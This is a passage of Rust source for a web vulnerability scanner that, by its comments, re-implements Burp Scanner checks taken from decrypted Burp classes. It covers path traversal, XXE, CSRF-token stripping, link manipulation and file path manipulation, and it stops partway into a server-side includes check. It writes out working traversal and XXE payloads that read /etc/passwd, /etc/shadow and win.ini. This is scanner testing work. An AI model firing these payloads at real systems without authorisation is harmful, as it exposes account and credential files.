// burp.Zge7 = XXE file-read check). The literal tables (payloads, markers,
// filenames) are encrypted in the jar and were read back from Burp's own
// decrypted classes (/root/burp-re/in/extract/burp/*.class) by running their
// static initialisers and walking the resulting objects:
//   Zco6 filenames, Zscp.ZL (27 payloads), Zw_c.ZE (Aho-Corasick tries,
//   decoded to strings), Zw_c.Ze (shadow regex), Zp3a.ZJ (path-like value).

/// burp.Zsv7: audit speed. A payload is used when configured >= payload tier
/// (Zsv7.Zi). Set in Settings > Scanner > Audit speed (`Shared::scan_speed`).
#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
pub(crate) enum ScanSpeed {
    Fast,
    Normal,
    Thorough,
}

impl ScanSpeed {
    pub(crate) fn from_u8(v: u8) -> Self {
        match v {
            0 => ScanSpeed::Fast,
            2 => ScanSpeed::Thorough,
            _ => ScanSpeed::Normal,
        }
    }
}

const OS_WINDOWS: u8 = 0;
const OS_UNIX: u8 = 1;

/// burp.Zco6: FILENAME_WINDOWS, FILENAME_PASSWD_UNIX, FILENAME_SHADOW_UNIX.
const TRAV_FILENAMES: [&str; 3] = ["win.ini", "passwd", "shadow"];

/// burp.Zw_c.ZE: per-OS file-content markers. Burp stores them upper-cased
/// in byte tries, i.e. the match is ASCII case-insensitive.
const FILE_MARKERS: [&[&str]; 2] = [
    &["; FOR 16-BIT APP SUPPORT", "[FONTS]", "[EXTENSIONS]", "[MCI EXTENSIONS]", "[FILES]"],
    &["ROOT:", "BIN:", "NOBODY:"],
];

/// burp.Zhcu row: os (Zg), placement (Ze: 0 = replace the value, 1 = value +
/// payload, 2 = payload + NUL + value), tier (ZY), text (ZH). Chars
/// U+0080..U+00FF stand for single raw bytes (Burp encodes with ISO-8859-1).
struct TravPayload {
    os: u8,
    placement: u8,
    speed: ScanSpeed,
    text: &'static str,
}

const fn tp(os: u8, placement: u8, speed: ScanSpeed, text: &'static str) -> TravPayload {
    TravPayload { os, placement, speed, text }
}

/// burp.Zscp.ZL, in Burp's order.
const TRAVERSAL_PAYLOADS: &[TravPayload] = {
    use ScanSpeed::*;
    &[
        tp(0, 0, Fast, "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"),
        tp(0, 0, Normal, "c:\\windows\\win.ini"),
        tp(0, 0, Thorough, "../../../../../../../../../../../../../../../../windows/win.ini"),
        tp(0, 0, Thorough, "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini"),
        tp(0, 0, Thorough, "../../../../../../../../../../../../../../../../winnt/win.ini"),
        tp(0, 0, Thorough, "\\windows\\win.ini"),
        tp(0, 0, Thorough, "file:///c:/windows/win.ini"),
        tp(0, 0, Thorough, "...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\windows\\win.ini"),
        tp(0, 0, Thorough, ".../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\windows/win.ini"),
        tp(0, 0, Thorough, "...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./windows/win.ini"),
        tp(0, 0, Thorough, "\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}windows\u{c0}\u{9c}win.ini"),
        tp(0, 0, Thorough, "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"),
        tp(0, 1, Fast, "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"),
        tp(0, 1, Thorough, "../../../../../../../../../../../../../../../../windows/win.ini"),
        tp(0, 1, Thorough, "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini"),
        tp(0, 1, Thorough, "../../../../../../../../../../../../../../../../winnt/win.ini"),
        tp(0, 2, Normal, "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"),
        tp(0, 2, Thorough, "c:\\windows\\win.ini"),
        tp(0, 2, Thorough, "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini"),
        tp(1, 0, Fast, "../../../../../../../../../../../../../../../../etc/passwd"),
        tp(1, 0, Normal, "/etc/passwd"),
        tp(1, 0, Thorough, "file:///etc/passwd"),
        tp(1, 0, Thorough, "..././..././..././..././..././..././..././..././..././..././etc/passwd"),
        tp(1, 0, Thorough, "\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}etc\u{c0}\u{af}passwd"),
        tp(1, 0, Thorough, "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        tp(1, 1, Fast, "../../../../../../../../../../../../../../../../etc/passwd"),
        tp(1, 2, Normal, "../../../../../../../../../../../../../../../../etc/passwd"),
    ]
};

/// burp.Zp3a.Zf: the effective tier. THOROUGH when configured so, when the
/// base value is empty, or when it looks like a path (Zp3a.ZJ).
pub(crate) fn traversal_speed(configured: ScanSpeed, value: &str) -> ScanSpeed {
    use std::sync::OnceLock;
    static PATHLIKE: OnceLock<regex::Regex> = OnceLock::new();
    if configured == ScanSpeed::Thorough || value.is_empty() {
        return ScanSpeed::Thorough;
    }
    let re = PATHLIKE.get_or_init(|| regex::Regex::new(r"^([ -.0-\[\]-~]*[\\/.][ -.0-\[\]-~]+)+$").unwrap());
    if re.is_match(value) {
        ScanSpeed::Thorough
    } else {
        configured
    }
}

/// burp.Zscp.Za: placement-0 payloads, then value + placement-1 payloads,
/// then placement-2 payloads + NUL + value.
pub(crate) fn traversal_candidates(value: &str, os: u8, speed: ScanSpeed) -> Vec<String> {
    let pick = |placement: u8| {
        TRAVERSAL_PAYLOADS
            .iter()
            .filter(move |p| p.os == os && p.placement == placement && speed >= p.speed)
            .map(|p| p.text)
    };
    let mut out: Vec<String> = pick(0).map(str::to_string).collect();
    out.extend(pick(1).map(|p| format!("{value}{p}")));
    out.extend(pick(2).map(|p| format!("{p}\u{0}{value}")));
    out
}

/// burp.Zw_c constructor: markers already present in the baseline response
/// are disabled, so a page that always says "[FILES]" never reports.
pub(crate) fn file_marker_baseline(baseline: &str, os: u8) -> Vec<bool> {
    let up = baseline.to_ascii_uppercase();
    FILE_MARKERS[os as usize].iter().map(|m| up.contains(m)).collect()
}

/// burp.Zw_c.ZN: the enabled markers for `os` found in `body`.
pub(crate) fn file_marker_hits(body: &str, os: u8, suppressed: &[bool]) -> Vec<&'static str> {
    let up = body.to_ascii_uppercase();
    FILE_MARKERS[os as usize]
        .iter()
        .enumerate()
        .filter(|(i, m)| !suppressed.get(*i).copied().unwrap_or(false) && up.contains(*m))
        .map(|(_, m)| *m)
        .collect()
}

/// burp.Zp3a.Zd/ZG: the negative control. The first known filename in the
/// payload gets an `X` appended (passwd -> passwdX); otherwise `X` is appended.
pub(crate) fn traversal_control(payload: &str) -> String {
    match TRAV_FILENAMES.iter().find(|f| payload.contains(*f)) {
        Some(f) => payload.replace(f, &format!("{f}X")),
        None => format!("{payload}X"),
    }
}

/// Encode a payload for a URL query insertion point: chars outside
/// printable ASCII are Burp's ISO-8859-1 bytes, sent percent-encoded, as are
/// the delimiters that would otherwise split the request line or the query.
pub(crate) fn encode_query_payload(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        let b = c as u32;
        if b <= 0x20 || b >= 0x7f || matches!(c, '&' | '#') {
            out.push_str(&format!("%{:02X}", b & 0xff));
        } else {
            out.push(c);
        }
    }
    out
}

pub(crate) struct FileReadHit {
    pub payload: String,
    pub file: &'static str,
    pub markers: Vec<&'static str>,
}

/// burp.Zp3a.ZF/ZM/Zg/ZS: try Windows then Unix candidates; a candidate hits
/// when enabled markers appear AND its `X` control shows none (ZV). A Unix
/// passwd hit is escalated to shadow (Zg); the shadow hit wins if it confirms.
/// `send` returns the response body for a raw (unencoded) payload value.
pub(crate) fn run_traversal_check<F: FnMut(&str) -> Option<String>>(
    value: &str,
    baseline: &str,
    configured: ScanSpeed,
    mut send: F,
) -> Option<FileReadHit> {
    let speed = traversal_speed(configured, value);
    let probe = |payload: &str, os: u8, send: &mut F| -> Option<Vec<&'static str>> {
        let suppressed = file_marker_baseline(baseline, os);
        let markers = file_marker_hits(&send(payload)?, os, &suppressed);
        if markers.is_empty() {
            return None;
        }
        let control = send(&traversal_control(payload)).unwrap_or_default();
        if !file_marker_hits(&control, os, &suppressed).is_empty() {
            return None; // markers regardless of filename: not a file read
        }
        Some(markers)
    };
    for os in [OS_WINDOWS, OS_UNIX] {
        for cand in traversal_candidates(value, os, speed) {
            let Some(markers) = probe(&cand, os, &mut send) else { continue };
            if os == OS_UNIX {
                let shadow = cand.replace("passwd", "shadow");
                if let Some(m2) = probe(&shadow, OS_UNIX, &mut send) {
                    return Some(FileReadHit { payload: shadow, file: "/etc/shadow", markers: m2 });
                }
            }
            let file = if os == OS_WINDOWS { "win.ini" } else { "/etc/passwd" };
            return Some(FileReadHit { payload: cand, file, markers });
        }
    }
    None
}

/// burp.Zge7.ZC: the XXE DOCTYPE variants. 0 = win.ini, 1 = passwd, and the
/// negative controls 2/3 point at the non-existent `…X` files.
pub(crate) fn xxe_doctype(entity: &str, variant: u8) -> String {
    let target = match variant {
        1 => "file:///etc/passwd",
        2 => "file:///c:/windows/win.iniX",
        3 => "file:///etc/passwdX",
        _ => "file:///c:/windows/win.ini",
    };
    format!("<!DOCTYPE foo [<!ENTITY {entity} SYSTEM \"{target}\"> ]>")
}

/// burp.Zmku.ZY: where the DOCTYPE goes. Leading whitespace is skipped, and
/// the XML declaration is stepped over only when the body starts with `<?xml`.
pub(crate) fn xml_doc_start(body: &str) -> usize {
    let mut i = body.bytes().take_while(|b| *b <= b' ').count();
    if body[i..].starts_with("<?xml") {
        if let Some(end) = body[i..].find("?>") {
            i += end + 2;
        }
    }
    i
}

/// burp.Zmku.Zs: element-value insertion points (XML_PARAM) after `from`,
/// at most `max`. A point is the text range of a leaf element
/// (`<a>value</a>`, possibly empty). Attributes (XML_ATTR) are not points
/// (burp.Zge7.ZA skips them).
pub(crate) fn xml_value_points(body: &str, from: usize, max: usize) -> Vec<(usize, usize)> {
    let mut out = Vec::new();
    let bytes = body.as_bytes();
    let mut i = from;
    while out.len() < max {
        let Some(lt) = body[i..].find('<').map(|x| x + i) else { break };
        let Some(gt) = body[lt..].find('>').map(|x| x + lt) else { break };
        let tag = &body[lt + 1..gt];
        let is_start = !tag.starts_with('/') && !tag.starts_with('?') && !tag.starts_with('!') && !tag.ends_with('/');
        if is_start {
            let vs = gt + 1;
            if let Some(next) = body[vs..].find('<').map(|x| x + vs) {
                if bytes.get(next + 1) == Some(&b'/') {
                    out.push((vs, next));
                }
            }
        }
        i = gt + 1;
    }
    out
}

/// burp.Zmku.Zs + Zmku.ZW: the body actually probed and its points. With no
/// element value, Burp inserts `<data></data>` at the DOCTYPE position and
/// uses its empty value.
pub(crate) fn xxe_points(body: &str) -> (String, usize, Vec<(usize, usize)>) {
    let doc = xml_doc_start(body);
    let points = xml_value_points(body, doc, 10);
    if !points.is_empty() {
        return (body.to_string(), doc, points);
    }
    let base = format!("{}<data></data>{}", &body[..doc], &body[doc..]);
    (base, doc, vec![(doc + 6, doc + 6)])
}

/// burp.Zge7.Ze: DOCTYPE at the document position, then the original value
/// (Zsif.ZT0) followed by the entity reference in place of the value range.
pub(crate) fn xxe_probe_at(base: &str, doc: usize, point: (usize, usize), entity: &str, variant: u8) -> String {
    let (vs, ve) = point;
    format!(
        "{}{}{}{}&{entity};{}",
        &base[..doc],
        xxe_doctype(entity, variant),
        &base[doc..vs],
        &base[vs..ve],
        &base[ve..]
    )
}

/// burp.Zge7: for each of up to 10 element values, try win.ini then passwd;
/// report the first variant whose markers appear (baseline-suppressed) while
/// its `X` control (variant + 2) shows none.
pub(crate) fn run_xxe_check<F: FnMut(&str) -> Option<String>>(
    body: &str,
    baseline: &str,
    entity: &str,
    mut send: F,
) -> Option<FileReadHit> {
    let (base, doc, points) = xxe_points(body);
    for point in points {
        for os in [OS_WINDOWS, OS_UNIX] {
            let probe = xxe_probe_at(&base, doc, point, entity, os);
            let suppressed = file_marker_baseline(baseline, os);
            let Some(resp) = send(&probe) else { continue };
            let markers = file_marker_hits(&resp, os, &suppressed);
            if markers.is_empty() {
                continue;
            }
            let control = send(&xxe_probe_at(&base, doc, point, entity, os + 2)).unwrap_or_default();
            if !file_marker_hits(&control, os, &suppressed).is_empty() {
                continue;
            }
            let file = if os == OS_WINDOWS { "win.ini" } else { "/etc/passwd" };
            return Some(FileReadHit { payload: probe, file, markers });
        }
    }
    None
}


/// Baseline response status code, if the baseline exchange produced a
/// response at all. Used by the CSRF probe, which must not run against a
/// request that already failed (burp.Zg8u.ZN).
fn base_status(resp: &Option<Vec<u8>>) -> Option<String> {
    let raw = resp.as_ref()?;
    let p = util::parse_http(raw);
    let status = p.first.split_whitespace().nth(1)?.to_string();
    if status.is_empty() {
        None
    } else {
        Some(status)
    }
}

/// Anti-CSRF token parameter names. Grounded in the decompiled token-name
/// tables: burp.Zg8w's static name sets (Zg = exact names, ZY/ZI = substring
/// families) and the decoded literals in burp.Zhq6
/// ("authenticity_token", "csrfmiddlewaretoken", plus the framework cookie
/// names jsessionid / phpsessid / ASP.NET_SessionId). WebProbe keeps the
/// name-level test only — Burp's value-level heuristics (Zg8w.Za/ZW/Zj) are
/// not reproduced, so this is the conservative subset.
fn is_csrf_token_param(name: &str, value: &str) -> bool {
    const EXACT: [&str; 6] = [
        "authenticity_token",
        "csrfmiddlewaretoken",
        "csrf_token",
        "xsrf_token",
        "_csrf",
        "__requestverificationtoken",
    ];
    const SUBSTR: [&str; 7] = [
        "csrf",
        "xsrf",
        "nonce",
        "authenticity",
        "synchronizer",
        "antiforgery",
        "requestverification",
    ];
    // burp.Zg8w.Zi: the token's VALUE must be at least six characters before
    // the parameter is worth treating as an anti-CSRF token — short values are
    // ordinary fields that merely contain a token-ish word.
    if value.len() < 6 {
        return false;
    }
    let n = name.to_ascii_lowercase();
    EXACT.contains(&n.as_str()) || SUBSTR.iter().any(|s| n.contains(s))
}

/// CSRF preconditions, from burp.Zm9o.ZP: a state-changing request that a
/// browser would send without a custom header — POST with a
/// urlencoded/multipart/absent body, and no `x-*` header other than
/// `x-requested-with` (that header makes the request pre-flighted and so
/// not CSRF-able by a plain form post).
fn csrf_applicable(method: &str, content_type: &str, headers: &[(String, String)]) -> bool {
    if !method.eq_ignore_ascii_case("POST") {
        return false;
    }
    let ct = content_type.to_ascii_lowercase();
    if !(ct.contains("x-www-form-urlencoded") || ct.contains("multipart/form-data") || ct.is_empty()) {
        return false;
    }
    !headers.iter().any(|(k, _)| {
        let lk = k.to_ascii_lowercase();
        lk.starts_with("x-") && lk != "x-requested-with"
    })
}

/// Drop the anti-CSRF token parameters from a urlencoded body (burp.Zg8w.ZU
/// builds the attack request by removing exactly these). Returns the new body
/// and the names removed; an empty `removed` means the request carries no
/// recognizable token and the probe must not run.
fn strip_csrf_params(body: &str) -> (String, Vec<String>) {
    let mut removed = Vec::new();
    let mut kept: Vec<&str> = Vec::new();
    for kv in body.split('&') {
        if kv.is_empty() {
            continue;
        }
        let name = kv.split('=').next().unwrap_or("");
        let value = kv.splitn(2, '=').nth(1).unwrap_or("");
        if is_csrf_token_param(name, value) {
            removed.push(name.to_string());
        } else {
            kept.push(kv);
        }
    }
    (kept.join("&"), removed)
}

/// Variant 2 of the active CSRF check (burp.Zwfm: "the request is
/// successful if these parameters are assigned empty values"): keep every
/// anti-CSRF token parameter but blank its value. Returns the new body and
/// the names blanked.
fn blank_csrf_params(body: &str) -> (String, Vec<String>) {
    let mut blanked = Vec::new();
    let mut kept: Vec<String> = Vec::new();
    for kv in body.split('&') {
        if kv.is_empty() {
            continue;
        }
        let name = kv.split('=').next().unwrap_or("");
        let value = kv.splitn(2, '=').nth(1).unwrap_or("");
        if is_csrf_token_param(name, value) {
            blanked.push(name.to_string());
            kept.push(format!("{name}="));
        } else {
            kept.push(kv.to_string());
        }
    }
    (kept.join("&"), blanked)
}

/// A static-token hit from variant 3: the parameter name and the value that
/// did not change across a cookie-less form reload.
struct StaticTokenHit {
    param: String,
    value: String,
    /// The cookie-less reload that showed the unchanged token.
    exchange: ScanEvidence,
}

/// Value of `name` in a form-rendered HTML body (`<input ... name="x"
/// value="y">`, either attribute order). Used by the static-token CSRF
/// variant, which reads the freshly rendered token out of the page.
fn form_token_value(html: &str, name: &str) -> Option<String> {
    let esc = regex::escape(name);
    let name_first = format!(
        r#"(?i)name\s*=\s*["']?{esc}["']?[^>]*?value\s*=\s*["']([^"']*)["']"#
    );
    let value_first = format!(
        r#"(?i)value\s*=\s*["']([^"']*)["'][^>]*?name\s*=\s*["']?{esc}["']?"#
    );
    let re = regex::Regex::new(&name_first).ok()?;
    if let Some(c) = re.captures(html) {
        return Some(c[1].to_string());
    }
    let re2 = regex::Regex::new(&value_first).ok()?;
    re2.captures(html).map(|c| c[1].to_string())
}

/// Variant 3 of the active CSRF check (burp.Zwfm: "the values of these
/// parameters do not change if the submitting form is reloaded without
/// supplying any cookies. Hence, the parameters are probably not being used
/// as anti-CSRF tokens"): GET the request path with no Cookie header, pull
/// each token parameter's freshly rendered value out of the form, and flag
/// the first one that is unchanged (a static token an attacker can read once
/// and replay). Needs `None` when the reload fails or renders nothing — a
/// failed reload must not become a finding.
fn csrf_static_token_hit(
    shared: &std::sync::Arc<crate::net::Shared>,
    https: bool,
    host: &str,
    port: u16,
    parts: &crate::util::HttpParts,
    req_body: &str,
) -> Option<StaticTokenHit> {
    // (name, original value) pairs for every token-looking parameter.
    let originals: Vec<(String, String)> = req_body
        .split('&')
        .filter_map(|kv| {
            let name = kv.split('=').next()?.to_string();
            let value = kv.splitn(2, '=').nth(1).unwrap_or("");
            if is_csrf_token_param(&name, value) {
                Some((name, value.to_string()))
            } else {
                None
            }
        })
        .collect();
    if originals.is_empty() {
        return None;
    }
    // GET request with the original headers minus the body-only and session
    // ones (Cookie is the point of the test; Content-Length/Type would
    // describe a body that no longer exists).
    let host_header = util::get_header(&parts.headers, "Host").unwrap_or_default();
    let mut get_req = format!("GET {} HTTP/1.1\r\n", parts.path);
    for (k, v) in &parts.headers {
        let lk = k.to_ascii_lowercase();
        if lk == "cookie" || lk == "content-length" || lk == "content-type" || lk == "host" {
            continue;
        }
        get_req.push_str(&format!("{k}: {v}\r\n"));
    }
    if host_header.is_empty() {
        get_req.push_str(&format!("Host: {host}\r\n"));
    }
    get_req.push_str("Connection: close\r\n\r\n");
    let up = if https {
        crate::net::send_tls_raw(shared, host, port, get_req.as_bytes())
    } else {
        crate::net::send_raw(shared, host, port, get_req.as_bytes())
    };
    let resp = up.resp?;
    let p = crate::util::parse_http(&resp);
    if !(p.status.starts_with('2') || p.status.starts_with('3')) {
        return None;
    }
    let html = String::from_utf8_lossy(&resp[p.head_len.min(resp.len())..]);
    for (name, original) in &originals {
        if let Some(fresh) = form_token_value(&html, name) {
            if !fresh.is_empty() && fresh == *original {
                return Some(StaticTokenHit { param: name.clone(), value: fresh, exchange: ScanEvidence::new(get_req.as_bytes(), Some(&resp[..])) });
            }
        }
    }
    None
}

/// Path component of a Location value, as lowercase. Handles absolute URLs,
/// scheme-relative URLs and bare paths; the query and fragment are dropped
/// because they never decide which resource was served.
fn location_path(location: &str) -> String {
    let mut rest = location.trim();
    if let Some(i) = rest.find("://") {
        rest = &rest[i + 3..];
        rest = rest.find('/').map(|j| &rest[j..]).unwrap_or("/");
    } else if rest.starts_with("//") {
        rest = rest[2..].split('/').next().map(|_| "/").unwrap_or("/");
        rest = rest.find('/').map(|j| &rest[j..]).unwrap_or("/");
    }
    let end = rest.find(['?', '#']).unwrap_or(rest.len());
    rest[..end].to_ascii_lowercase()
}

/// True when a redirect still points at the requested resource: the target
/// path equals it or continues below it. A redirect that leaves the path
/// (login, SSO, error page) is a rejection.
fn redirect_stays_on_path(location: &str, path: &str) -> bool {
    let target = location_path(location);
    if target.is_empty() {
        return true; // no Location to judge: fall back to the status result
    }
    let want = path.to_ascii_lowercase();
    target == want || target.starts_with(&format!("{want}/"))
}

/// True when the token-stripped replay is still accepted, i.e. the server
/// did not enforce the anti-CSRF token. Burp family:
/// SCANNER_ACTIVE_CHECKS_CSRF (burp.Zg8u); the baseline itself must be a
/// success (burp.Zg8u.ZN skips 4xx/5xx originals) and the replay must not
/// have been bounced to a login page.
fn is_csrf_hit(baseline_status: &str, probe_status: &str, probe_location: &str, path: &str) -> bool {
    if !(baseline_status.starts_with('2') || baseline_status.starts_with('3')) {
        return false;
    }
    if !(probe_status.starts_with('2') || probe_status.starts_with('3')) {
        return false;
    }
    // A redirect whose target path is elsewhere (login / SSO bounce) means the
    // request was rejected, not silently accepted. Comparing PATHS rather than
    // keywords matters: login URLs commonly carry the original path in a
    // `next=` parameter, and a keyword test would read that as acceptance.
    !(probe_status.starts_with('3')
        && !probe_location.is_empty()
        && !redirect_stays_on_path(probe_location, path))
}


// ================= Link manipulation (reflected) (burp.Zb_5) =================

pub(crate) struct LinkManipHit {
    pub payload: String,
    pub target: String,
}

/// Link-attribute targets in a response: href/src/action/formaction values
/// plus redirect targets (burp.Zpyp injects a URL and checks it becomes a
/// link/redirect target the page points at).
fn link_targets(resp: &[u8]) -> Vec<String> {
    let mut out = redirect_targets(resp);
    let p = crate::util::parse_http(resp);
    let body = String::from_utf8_lossy(&resp[p.head_len.min(resp.len())..]).into_owned();
    let low = body.to_ascii_lowercase();
    for attr in ["href=", "src=", "action=", "formaction="] {
        let mut i = 0;
        while let Some(a) = low[i..].find(attr).map(|x| x + i) {
            let vs = a + attr.len();
            let rest = &body[vs.min(body.len())..];
            let val = if rest.starts_with('"') || rest.starts_with('\'') {
                let q = rest.as_bytes()[0] as char;
                rest[1..].split(q).next().unwrap_or("").to_string()
            } else {
                rest.split([' ', '>', '\t', '\n']).next().unwrap_or("").to_string()
            };
            if !val.is_empty() {
                out.push(val);
            }
            i = vs;
        }
    }
    out
}

/// Live passive crawl: same-origin link paths found in a response, resolved
/// against the request path (query kept, fragment dropped).
pub fn crawl_links(origin: &str, req_path: &str, resp: &[u8]) -> Vec<String> {
    let base = req_path.split('?').next().unwrap_or("/");
    let base = match base.split_once("://") {
        Some((_, r)) => r.find('/').map(|i| r[i..].to_string()).unwrap_or_else(|| "/".into()),
        None => base.to_string(),
    };
    let dir = &base[..=base.rfind('/').unwrap_or(0)];
    let mut out = Vec::new();
    // Links come from HTML documents (and redirects), as a browser sees them:
    // href/src strings inside script bundles are not navigations.
    let ct = util::get_header(&util::parse_http(resp).headers, "Content-Type").unwrap_or_default().to_ascii_lowercase();
    let targets = if ct.contains("html") { link_targets(resp) } else { redirect_targets(resp) };
    for l in targets {
        let l = l.split('#').next().unwrap_or("").trim().to_string();
        if l.is_empty() || l.starts_with("javascript:") || l.starts_with("mailto:") || l.starts_with("data:") {
            continue;
        }
        if l.chars().any(|c| c.is_whitespace() || "`{}()<>;$\"'\\".contains(c)) {
            continue;
        }
        let path = if let Some(rest) = l.strip_prefix(origin) {
            if rest.is_empty() { "/".to_string() } else if rest.starts_with('/') { rest.to_string() } else { continue }
        } else if l.contains("://") || l.starts_with("//") {
            continue;
        } else if l.starts_with('/') {
            l
        } else {
            format!("{dir}{l}")
        };
        // Collapse ./ and ../ segments.
        let (p, q) = match path.split_once('?') { Some((p, q)) => (p.to_string(), Some(q.to_string())), None => (path.clone(), None) };
        let mut segs: Vec<&str> = Vec::new();
        let ends_dir = p.ends_with('/') || p.ends_with("/.") || p.ends_with("/..");
        for seg in p.split('/') {
            match seg {
                "." => {}
                ".." => { segs.pop(); }
                s => segs.push(s),
            }
        }
        let mut joined = segs.join("/");
        if ends_dir && !joined.ends_with('/') {
            joined.push('/');
        }
        if !joined.starts_with('/') {
            joined.insert(0, '/');
        }
        if let Some(q) = q {
            joined = format!("{joined}?{q}");
        }
        if !out.contains(&joined) {
            out.push(joined);
        }
    }
    out
}

/// burp.Zb_5 reflected link manipulation: inject an absolute URL and report
/// when it becomes a link or redirect target the page points at (value
/// replaced then appended, burp.Zw7s REPLACE/APPEND).
pub(crate) fn run_link_manip_check<F: FnMut(&str) -> Option<Vec<u8>>>(_value: &str, mut send: F) -> Option<LinkManipHit> {
    // burp.Zb_5 (LINK_MANIPULATION_REFLECTED): the value is replaced by a
    // random 10-character token, which must come back unmodified inside a
    // URL: a link in the page or the Location / Refresh target (Burp, lab
    // /redirect: "echoed unmodified within the response header Location").
    // Nothing is appended to the original value, so allowlisting redirectors
    // (Juice Shop /redirect) reject the probe as they do Burp's.
    let token: String = {
        use rand::Rng;
        let mut g = rand::thread_rng();
        (0..10).map(|i| if i == 8 { (b'0' + g.gen_range(0..10)) as char } else { (b'a' + g.gen_range(0..26)) as char }).collect()
    };
    let resp = send(&token)?;
    let target = link_targets(&resp).into_iter().chain(redirect_targets(&resp)).find(|t| t.contains(&token))?;
    Some(LinkManipHit { payload: token, target })
}
// ================= File path manipulation (burp.Zsl1) =================

/// burp.Zulm: valid (same-file) and invalid path variants of a path-like
/// value. Templates decoded from Zulm.ZV/Zb (%1=sep, %2=file, %3=random).
pub(crate) fn file_path_variants(value: &str) -> Option<(String, Vec<String>, Vec<String>)> {
    let sep = if !value.contains('/') && value.contains('\\') { "\\" } else { "/" };
    let cut = value.rfind(['/', '\\']);
    let (dir, file) = match cut {
        Some(i) => (&value[..i + 1], &value[i + 1..]),
        None => ("", value),
    };
    if file.is_empty() {
        return None;
    }
    let r = || {
        use rand::Rng;
        let mut g = rand::thread_rng();
        (0..3).map(|_| (b'a' + g.gen_range(0..26)) as char).collect::<String>()
    };
    // Zulm.ZV: redundant paths to the same file (should return the same file).
    let valid = vec![
        format!("{dir}.{sep}{file}"),
        format!("{dir}.{sep}.{sep}{file}"),
        format!("{dir}.{sep}.{sep}.{sep}{file}"),
    ];
    // Zulm.Zb: bogus variants (should not return the same file).
    let invalid = vec![
        format!("{dir}...{sep}{file}"),
        format!("{dir}{}{sep}{file}", r()),
        format!("{dir}{file}{}", r()),
    ];
    Some((dir.to_string(), valid, invalid))
}

pub(crate) struct FilePathManipHit {
    pub valid: String,
    pub invalid: String,
    pub attributes: Vec<crate::variations::Attr>,
}

/// burp.Zsl1: for a path-like value, the redundant-path variants (same file)
/// must respond consistently differently from the bogus variants, proving the
/// parameter selects a file. Runs Burp's differential engine (Zmaq).
pub(crate) fn run_file_path_manip_check<F: FnMut(&str) -> Option<Vec<u8>>>(
    value: &str,
    baseline: &[u8],
    accuracy: crate::variations::Accuracy,
    mut send: F,
) -> Option<FilePathManipHit> {
    // Only applies to a value that looks like a path (burp.Zsl1 gate).
    if !value.contains(['/', '\\', '.']) || value.len() < 3 {
        return None;
    }
    let (_, valid, invalid) = file_path_variants(value)?;
    let (vi, ii) = (std::cell::Cell::new(0usize), std::cell::Cell::new(0usize));
    let sent = std::cell::RefCell::new(&mut send);
    let attrs = crate::variations::differential(
        Some(baseline),
        accuracy,
        || {
            let p = &valid[vi.get() % valid.len()];
            vi.set(vi.get() + 1);
            (sent.borrow_mut())(p)
        },
        || {
            let p = &invalid[ii.get() % invalid.len()];
            ii.set(ii.get() + 1);
            (sent.borrow_mut())(p)
        },
    )?;
    Some(FilePathManipHit { valid: valid[0].clone(), invalid: invalid[0].clone(), attributes: attrs })
}
// ================= Server-side includes injection (burp.Zexx) =================

const SSI_ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";

/// burp.Zcub.Zy: Caesar shift of the first `len` alphabet chars of `s` by
/// `shift` over the 36-char alphabet.
fn ssi_shift(s: &str, shift: usize, len: usize) -> String {
    s.chars()
        .filter_map(|c| SSI_ALPHABET.iter().position(|&a| a == c as u8))
        .take(len)
        .map(|i| SSI_ALPHABET[(i + shift) % SSI_ALPHABET.len()] as char)
        .collect()
}

/// burp.Zxvd.Zu: the SSI echo-based payload. id1/value1 shift by 14/13,
/// id2/value2 by 16/15 (burp.Zcub.Zs). Returns (payload, expected echo).
pub(crate) fn ssi_payload(token: &str) -> (String, String) {
